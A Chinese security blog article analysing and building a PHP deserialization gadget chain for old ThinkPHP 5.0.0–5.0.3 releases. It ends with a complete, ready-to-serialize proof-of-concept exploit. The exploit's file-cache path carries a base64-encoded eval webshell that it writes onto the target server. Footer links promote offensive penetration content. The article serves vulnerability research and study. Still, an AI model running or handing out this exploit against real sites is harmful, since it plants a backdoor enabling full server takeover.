\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzUyODkwNDIyMg==&mid=2247490507&idx=1&sn=6b89c041bbfae6c930b33248f516f7b5&chksm=fa6862bacd1febacc193b6b5aa897d18ac5f0fa8fdd95430a8886b4c5d4c4d7f0103ef74e71e&mpshare=1&scene=1&srcid=1014WZ8HKI65efWKut5hQlhS&sharer\_sharetime=1602635418163&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=c5a371d2ca02e6846d7e9f90074c8984d06a194e1cbca2763ab5ee60091e9ab158e1f65fec71ec9371243c02af048e74401bd10403bd011b918f75454a56aab84c689e4e102b329d5d47d234447bfe838239be69d7357e7f30b240ec3ce807e794bcbe4f72d9016f087244bd67ff9cbb5ca289d64b2f7916432e6038247cc3e8&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=AbBnBmhaEf1h8lPy9Sivefs%3D&pass\_ticket=5iBkjjQtfbEoCMU4%2BnfhOAJi%2FVJ%2BFty3yCm8kFn8GVUk3mWzBKMJBjfoyOfZ%2B5pr&wx\_header=0)

**高质量的安全文章，安全 offer 面试经验分享**

**尽在 # 掌控安全 EDU #**

前言

背景  

日常渗透测试中，ThinkPHP 低版本的站点虽然很少，但是总会有的，之前有大佬公开 5.0.\* 的利用链，是适合中高版本的 ThinkPHP 框架，由于一些代码的改动，导致在某些地方并不能兼容所有的版本。

比如：

*   在 5.0.16 版本以下，HasOne 类的 getRelation 的触发点 removeWhereField 方法未被调用。
    
*   在 5.0.11 版本以下，model 类得三目运算符处的出发点不存在。
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbqTzTFtZnChxLiaJQ1iaRA3FRSceyQj0zBg69wUIgdZ0ibia2X1DG1uocVA/640?wx_fmt=png)
    
*   在 5.0.4 版本以下，触发的位置又有所不同。
    

本文将对已知反序列化利用链进行分析，并对比新老版本差异，构造属于老版本的利用链。

测试版本

*   ThinkPHP v5.0.0-5.0.3
    

### POC 分析

#### 已知利用链

ThinkPHP5.0.x 反序列化利用链（https://xz.aliyun.com/t/7082）

Thinkphp5.0 反序列化链在 Windows 下写文件的方法（https://xz.aliyun.com/t/7457）

上面对反序列化进行了分析，并构造出了适合 windows 和 linux 的稳定 poc

个人认为核心触发点是 output 类得\_\_call 方法，调用 block 方法去完成文件的写入操作。

尝试去看了下其他的终点，暂未找到更好的利用方式。

经过对比，5.0.24 版本的\_\_call 方法之后的节点与 5.0.0 版本的并无差异。

所以需要构造的新的入口点以及中间的跳转节点。

#### 对比差异

##### 原 poc 链

秉承着代码向下兼容的原则，适用于高版本的不一定适用低版本，但是这个很奇葩，向上也不兼容。

首先来看看原 poc 链条中其实有两处可以触发 output 类得\_\_call 方法。

第一种

自然是大家都说的三目运算符处，触发的魔术方法，$this->append 是可控的，所以 name 参数是可控的。注意需要满足以下条件

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbJBaouCibF0iaUSDfMDPe4mR6yLzkWaMhwvsAYT3rMEpYeeKiaD6cpwYfQ/640?wx_fmt=png)

流程跟踪

*   定义 append 未数组，值为 getError
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbw6LmicVsxMqCaqDoA4xaAibIJRIJl8er4OB2O1PwYUGH3nORccadJia0Q/640?wx_fmt=png)
    
*   直接进入 else 分支
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbZ1X4nyn6nBrmKQW84oE81qCzb6mcpOiaqx0F21diboJibas1K8myPDsOA/640?wx_fmt=png)
    
*   this->error 设置为 HasOne 类，modelRelation 就是可控的，进入 getRelationData 方法
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbU3qshVgneTQ9d82ELBNAgLtEdiapiaAsnJnrU1a9qHdhYocyPZbcg1icg/640?wx_fmt=png)
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbW6XKe79zYp9iaTyHQFVfxkwdfnXsWenvRpxVWj6JDoMOO2Eudm6vEUQ/640?wx_fmt=png)
    
*   此处判断条件满足，即可进入三目运算，已尝试，可行，poc 自行构造，网上的 poc 有不少是利用的下面的第二种方法触发的
    

第二种

接上图，他们构造的 poc 没能完成 if 语句的判断，最终进入了 else 分支，如果方法存在，则调用 getRelation 方法，由于 modelRelation 参数是可控的，所以可调用任意类的 getRelation 方法，找到 HasOne 类的 getRelation 方法

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbhb0qWyZZqqEx4JOpMej5zn6oIGySjXWmoLuJnicMGOWI27qgib7arcXQ/640?wx_fmt=png)

##### 差异

在旧版本中，以上两处触发的方式均不可用

如下图，此版本无三目运算符的判断

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbXEqNMrK85bTOEBO863DYXj9SLxGic3nhB1tIVhfAPvRibKDgjnibDaMkQ/640?wx_fmt=png)

getAttr 方法种倒是调用了 getRelation 方法，但是有个神判断，我过不去

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbCv125mzKGtt37NFRd7mRcHrjhklBK62b0Zzs4AIEqqicSEy4UTd34icw/640?wx_fmt=png)

所以，以上两条利用链均不可使用，需要找其他的利用链，大家的入口点都是 windows 类得析构方法，然后触发\_\_toString 方法，此路不通，需要找其他的入口点以及节点，查了查析构方法，还剩三个，挨个看就是了

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZboyia1SOg3GY78NUwBbjd1Jq7YoDNGicA5yzQ733R5eGWxGf0j5lA8fsw/640?wx_fmt=png)

### 构造利用链

寻找入口点

*   找到入口点为 Process 类的析构方法，跟进
    
*   调用了 stop 方法
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbdDv9NJ7ObH8YbC7JDyxdHw7xvuyBUINNMb1IhMgu84N9gBmxUiar5vw/640?wx_fmt=png)
    

构造中间节点

*   跟进 stop 方法
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbTkCFyVpxWT69b0poPlSiabQGMkFxJ1SusYoATLot14SWIneofZRvryQ/640?wx_fmt=png)
    
*   此处需要跳过第一处的判断，跟进 isRunning 方法，很简单
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbPROyb9J3gQmoxWPIr4bJ2BSKasm2YyXPAzaxADFaFbiabw5ooXI4sxA/640?wx_fmt=png)
    
*   第二处的判断可控，进入 close 方法，跟进
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbmasTCYnnBUiasT6jUBuf4VfRdzOkVJqibvCxxOiaA9Posm1qvVyPHklcw/640?wx_fmt=png)
    
*   此处可直接触发\_\_call 方法
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbkkdzibaqYWIhE3FD8dXM4Pia83feZOhpIbRzl1ItGaSVRNDC0OqJym0g/640?wx_fmt=png)
    
*   但是在调用 block 方法后，由于 block 需要一个字符型的参数值，而我们没有进行传参，所以会抛出需要参数值的异常
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbp6cG4Z5HEvuVNWfoJhkOm2ure5cduRKAQZCDHlnfDqszSICSr0WWibg/640?wx_fmt=png)
    
*   所以需要在增加中间节点，找到了这么一处，Relation 类得\_\_call 方法
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZb3cQILuA0n3vRy5oReBG0o7PibpwjMic3qJ6fZf2n4JXx7cmzGwsbGpCA/640?wx_fmt=png)
    
*   上面类可控并且参数值可控，算是挺完美的触发点了
    
*   继续调用 output 类得\_\_call 方法，即可完成文件写入操作
    
*   完整的流程图不在画了
    

### 构造 POC

测试代码

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbRIlRVA2viajCEAxrPVkuO7621S0lGcrwB4JdGLR3icwVp1BudhZaSDEQ/640?wx_fmt=png)

虽然抛出致命错误，但并不影响文件生成

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcoEau0P6QRyzcOAs4YoplZbdYGTaTiarSia1L1WTq2tNafzeibnQX7q8uFEmWYBp1TzgGFKmnT1SxqvQ/640?wx_fmt=png)

### POC

```
<?php
//修改入口类，添加中间Relation类得call方法跳转
namespace think{
 use think\\model\\Relation;
 class Process{
 private $status = '';
 private $processPipes;
 private $processInformation;
 function \_\_construct(){
 $this->processInformation = \['running'=>'1'\];
 $this->status = 'starte';
 $this->processPipes = new Relation();
 }
 }
}
namespace think\\model{
 use think\\console\\Output;
 class Relation{
 protected $type;
 protected $query;
 protected $where;
 function \_\_construct(){
 $this->type = 2;
 $this->query = new Output();
 $this->where = '1';
 }
 }
}
namespace think\\console{
 use think\\session\\driver\\Memcached;
 class Output{
 private $handle;
 protected $styles;
 function \_\_construct()
 {
 $this->styles = \['where'\];
 $this->handle = new Memcached(); //$handle->think\\session\\driver\\Memcached
 }
 }
}
namespace think\\session\\driver {
 use think\\cache\\driver\\File;
 class Memcached
 {
 protected $handler;
 function \_\_construct()
 {
 $this->handler = new File(); //$handle->think\\cache\\driver\\File
 }
 }
}
namespace think\\cache\\driver {
 class File
 {
 protected $options=null;
 protected $tag;
 function \_\_construct(){
 $this->options=\[
 'expire' => 3600, 
 'cache\_subdir' => false, 
 'prefix' => '', 
 'path' => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php',
 'data\_compress' => false,
 \];
 $this->tag = 'xxx';
 }
 }
}
namespace {
 $window = new think\\Process();
 echo str\_replace('+', '%20', urlencode(serialize($window)));
 //echo base64\_encode(serialize($window));
}
```

### END

由于在后续版本中 Relation 重构，且成为了抽象类，所以此方法无法向上兼容，仅作学习参考

改变其中的某些节点，可覆盖 5.0.4-5.0.24 版本

  

**回顾往期内容**

[一起来学 PHP 代码审计（一）入门](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487858&idx=1&sn=47c58061798afda9f50d6a3b838f184e&chksm=fa686803cd1fe115a3af2e3b1e42717dcc6d8751c888d686389f6909695b0ae0e1f4d58e24b3&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[新时代的渗透思路！微服务下的信息搜集](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487493&idx=1&sn=9ca65b3b6098dfa4d53a0d60be4bee51&chksm=fa686974cd1fe062500e5afb03a0181a1d731819f7535c36b61c05b3c6144807e0a76a0130c5&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[反杀黑客 — 还敢连 shell 吗？蚁剑 RCE 第二回合~](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247485574&idx=1&sn=d951b776d34bfed739eb5c6ce0b64d3b&chksm=fa6871f7cd1ff8e14ad7eef3de23e72c622ff5a374777c1c65053a83a49ace37523ac68d06a1&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[防溯源防水表—APT 渗透攻击红队行动保障](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487533&idx=1&sn=30e8baddac59f7dc47ae87cf5db299e9&chksm=fa68695ccd1fe04af7877a2855883f4b08872366842841afdf5f506f872bab24ad7c0f30523c&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)

扫码白嫖视频 + 工具 + 进群 + 靶场等资料

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)

 **扫码白嫖****！**

 **还有****免费****的配套****靶场****、****交流群****哦！**